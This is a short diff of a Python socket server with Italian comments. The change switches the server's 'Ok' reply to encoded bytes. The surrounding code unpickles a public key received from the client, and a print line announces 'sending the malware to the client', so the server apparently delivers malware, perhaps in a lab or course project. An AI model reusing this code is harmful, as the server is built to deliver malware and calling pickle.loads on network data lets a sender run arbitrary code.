@@ -33,7 +33,7 @@ if __name__ == "__main__":
 		# ricevo la chiave pubblica del client
 		byte_client_public_key = client.recv(BUFFER_SIZE)  # aspetto una risposta
 		public_key = pickle.loads(byte_client_public_key)
-		client.send("OK")
+		client.send("Ok".encode("utf8"))
 
 		# invio del file al client
 		print("Invio del malware al client")
